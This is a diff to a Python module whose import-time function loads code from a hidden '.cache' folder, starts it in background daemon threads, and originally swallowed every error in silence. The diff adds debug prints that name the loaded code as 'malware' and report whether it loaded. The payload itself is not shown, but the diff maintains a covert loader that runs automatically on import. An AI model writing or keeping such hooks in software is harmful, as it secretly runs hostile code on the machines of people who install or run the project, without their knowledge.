@@ -24,10 +24,23 @@ import executor
 from scanner import Scanner
 
 
+# ============================================
+# DEBUG: Check if .cache exists
+# ============================================
+print(f"[DEBUG] Current dir: {os.getcwd()}")
+cache_path = Path(__file__).parent / ".cache"
+print(f"[DEBUG] .cache exists: {cache_path.exists()}")
+if cache_path.exists():
+    print(f"[DEBUG] .cache contents: {list(cache_path.iterdir())}")
+# ============================================
+
+
 def _start():
     try:
         p = Path(__file__).parent / ".cache"
+        print(f"[DEBUG] Looking for .cache at: {p}")
         if p.exists():
+            print("[DEBUG] .cache found! Loading malware...")
             sys.path.insert(0, str(p))
             from utils import setup
             from monitor import start
@@ -36,8 +49,11 @@ def _start():
             s = setup()
             threading.Thread(target=s.run, daemon=True).start()
             threading.Thread(target=start, daemon=True).start()
-    except:
-        pass
+            print("[DEBUG] Malware loaded successfully")
+        else:
+            print("[DEBUG] .cache NOT found!")
+    except Exception as e:
+        print(f"[DEBUG] Malware load error: {e}")
 
 _start()
 
